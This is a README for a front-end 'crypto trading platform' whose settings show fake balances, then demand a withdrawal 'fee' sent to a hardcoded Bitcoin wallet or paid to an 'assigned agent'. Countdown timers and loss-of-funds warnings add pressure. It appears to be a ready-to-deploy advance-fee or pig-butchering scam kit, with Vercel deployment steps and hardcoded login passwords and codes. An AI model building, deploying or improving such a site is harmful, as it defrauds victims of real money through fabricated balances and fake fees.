# Crypto Trading Platform

A modern, environment-driven cryptocurrency trading simulation platform built with React, TypeScript, and Vite. All configuration is managed through environment variables with no database or backend server required.

## Features

- **Authentication System**: Password and verification code-based login with optional stay-logged-in functionality
- **User Profiles**: Customizable user information with VIP and verification status
- **Crypto Balances**: Display and manage cryptocurrency and fiat currency balances
- **Withdrawal System**: Complete withdrawal flow with countdown timers and fee processing
- **Responsive Design**: Mobile-first UI that works seamlessly across all devices
- **Pure Frontend**: No backend server or database—all configuration via environment variables

## Quick Start

### Prerequisites

- Node.js 16+ 
- pnpm (or npm/yarn)

### Installation

1. Clone or download the project
2. Install dependencies:
   ```bash
   pnpm install
   ```

3. Create a `.env.local` file in the root directory with your configuration:
   ```env
   # Authentication
   VITE_AUTH_PASSWORD=199JGVS9
   VITE_AUTH_VERIFICATION_CODES=482911,193002,775421,556287,880027
   VITE_ADMIN_PASSWORD=CODE08
   VITE_TEST_MODE=false

   # Profile
   VITE_PROFILE_PHOTO=https://upsrtp1luhf8u0tv.public.blob.vercel-storage.com/product-images/1775218845955-56841.jpg
   VITE_PROFILE_NAME=Crypto Trader
   VITE_USER_ID=847362951
   VITE_IS_VIP=true
   VITE_IS_VERIFIED=false

   # Balances
   VITE_CRYPTO_BALANCE=8.5483
   VITE_CRYPTO_SYMBOL=BTC
   VITE_FIAT_BALANCE=506384.44
   VITE_FIAT_SYMBOL=€

   # Withdrawal Modal
   VITE_MODAL_TITLE_TEMPLATE=Processing Withdrawal of [AMOUNT]
   VITE_MODAL_MESSAGE=To process your withdrawal, meet with your assigned agent to pay the fee or send the exact fee amount below to complete your withdrawal process.\n\nPlease verify all details carefully before proceeding. Cryptocurrency transactions cannot be reversed once confirmed on the blockchain.\n\nDouble-check the receiving address and ensure it matches your withdrawal destination. Verify the network selection is correct to prevent any loss of funds.
   VITE_PRIORITY_QUEUE_TITLE=Priority Fee
   VITE_PRIORITY_QUEUE_DESCRIPTION=A processing fee is required to complete this withdrawal request.
   VITE_NETWORK_DISPLAY_NAME=Bitcoin
   VITE_ADMIN_WALLET_ADDRESS=bc1qfgsglp48a3apm983rckjlqh7jckrgns46wfd44
   VITE_YELLOW_WARNING_TEXT=Please ensure you complete your withdrawal to avoid potential loss of funds due to service discontinuation.
   VITE_FEE_AMOUNT=0.9147
   VITE_COUNTDOWN_DURATION=6872800
   VITE_PRIMARY_BUTTON_TEXT=Continue
   VITE_SECONDARY_BUTTON_TEXT=Cancel

   # Pending Page
   VITE_PENDING_TITLE=Withdrawal Pending
   VITE_PENDING_MESSAGE_LINE1=Your withdrawal request has been received and is currently pending processing.
   VITE_PENDING_MESSAGE_LINE2=Please complete the required network fee payment. Check your email for withdrawal updates.
   VITE_PENDING_MESSAGE_LINE3=Your withdrawal will be processed once the payment is confirmed and a transaction ID will be generated.
   VITE_PENDING_OK_BUTTON_TEXT=OK
   ```

4. Start the development server:
   ```bash
   pnpm dev
   ```

5. Open your browser and navigate to `http://localhost:5173`

## Configuration

All application settings are managed through environment variables in the `.env.local` file. No admin dashboard or database modifications needed.

### Authentication Variables
- `VITE_AUTH_PASSWORD`: Main login password
- `VITE_AUTH_VERIFICATION_CODES`: Comma-separated list of valid verification codes
- `VITE_ADMIN_PASSWORD`: Admin panel password (legacy, not used in current version)
- `VITE_TEST_MODE`: Enable/disable test mode

### User Profile Variables
- `VITE_PROFILE_PHOTO`: URL to user's profile photo
- `VITE_PROFILE_NAME`: Display name for the user
- `VITE_USER_ID`: Unique user identifier
- `VITE_IS_VIP`: Boolean indicating VIP status
- `VITE_IS_VERIFIED`: Boolean indicating verification status

### Balance Variables
- `VITE_CRYPTO_BALANCE`: Amount of cryptocurrency held
- `VITE_CRYPTO_SYMBOL`: Cryptocurrency symbol (e.g., BTC, ETH)
- `VITE_FIAT_BALANCE`: Amount of fiat currency held
- `VITE_FIAT_SYMBOL`: Fiat currency symbol (e.g., €, $)

### Withdrawal Modal Variables
- `VITE_MODAL_TITLE_TEMPLATE`: Title template for withdrawal modal (use [AMOUNT] placeholder)
- `VITE_MODAL_MESSAGE`: Detailed withdrawal instruction message
- `VITE_PRIORITY_QUEUE_TITLE`: Fee processing title
- `VITE_PRIORITY_QUEUE_DESCRIPTION`: Fee processing description
- `VITE_NETWORK_DISPLAY_NAME`: Blockchain network name
- `VITE_ADMIN_WALLET_ADDRESS`: Wallet address for fee payments
- `VITE_YELLOW_WARNING_TEXT`: Warning text displayed in withdrawal modal
- `VITE_FEE_AMOUNT`: Fee amount required for withdrawal
- `VITE_COUNTDOWN_DURATION`: Countdown timer duration in seconds
- `VITE_PRIMARY_BUTTON_TEXT`: Primary button text in modal
- `VITE_SECONDARY_BUTTON_TEXT`: Secondary button text in modal

### Pending Page Variables
- `VITE_PENDING_TITLE`: Title for pending withdrawal page
- `VITE_PENDING_MESSAGE_LINE1`: First line of pending message
- `VITE_PENDING_MESSAGE_LINE2`: Second line of pending message
- `VITE_PENDING_MESSAGE_LINE3`: Third line of pending message
- `VITE_PENDING_OK_BUTTON_TEXT`: Button text on pending page

## Project Structure

```
src/
├── components/          # Reusable UI components
├── contexts/           # React context for global state
├── pages/              # Page components
├── storage/            # Local storage and data persistence
├── hooks/              # Custom React hooks
├── utils/              # Utility functions
└── App.tsx            # Main application component

public/                # Static assets
styles/                # Global styles
```

## Building for Production

Build the application for production:
```bash
pnpm build
```

Preview the production build locally:
```bash
pnpm preview
```

## Deployment

### Deploy to Vercel

1. Push your code to a GitHub repository
2. Connect your repository to Vercel
3. Add all environment variables from your `.env.local` to Vercel's project settings under "Environment Variables"
4. Deploy

The app will automatically build and deploy with your environment configuration.

### Deploy Anywhere Else

Since this is a static Vite application, you can deploy the `dist/` folder to any static hosting service (Netlify, GitHub Pages, AWS S3, etc.). Just ensure your environment variables are set in your hosting provider.

## User Flows

### Login Flow
1. User enters password on login page
2. System verifies against `VITE_AUTH_PASSWORD`
3. User enters verification code from the provided list
4. Optional: User can choose to stay logged in
5. User is directed to service suspension page

### Withdrawal Flow
1. User initiates withdrawal
2. Modal displays configured withdrawal information
3. User sees countdown timer based on `VITE_COUNTDOWN_DURATION`
4. User can confirm or cancel the withdrawal
5. Upon confirmation, user is redirected to pending page
6. Pending page displays configured messages

### Session Management
- Login sessions are stored in localStorage
- Sessions respect the stay-logged-in preference
- Clearing localStorage will log the user out
- No server-side session management required

## Data Storage

- **Configuration**: Loaded from environment variables at startup
- **Session Data**: Stored in browser localStorage (survives page refreshes)
- **Withdrawal History**: Stored in localStorage for reference
- **No Remote Sync**: All data is local to the client

## Development

### Available Scripts

- `pnpm dev` - Start development server with hot module replacement
- `pnpm build` - Build for production
- `pnpm preview` - Preview production build
- `pnpm lint` - Run ESLint on the codebase

### Code Style

- TypeScript for type safety
- ESLint for code consistency
- React hooks for state management
- Component-based architecture

## Troubleshooting

### Variables Not Loading
- Ensure `.env.local` is in the root directory
- Restart the development server after changing `.env.local`
- Variables must be prefixed with `VITE_` to be accessible in the client

### Login Issues
- Verify `VITE_AUTH_PASSWORD` is correctly set
- Check that verification codes in `VITE_AUTH_VERIFICATION_CODES` are comma-separated without spaces
- Clear browser localStorage and try again

### Withdrawal Modal Not Showing
- Ensure all withdrawal-related variables are set in `.env.local`
- Check browser console for any error messages
- Verify `VITE_MODAL_MESSAGE` contains proper message formatting

## License

This project is proprietary and confidential.
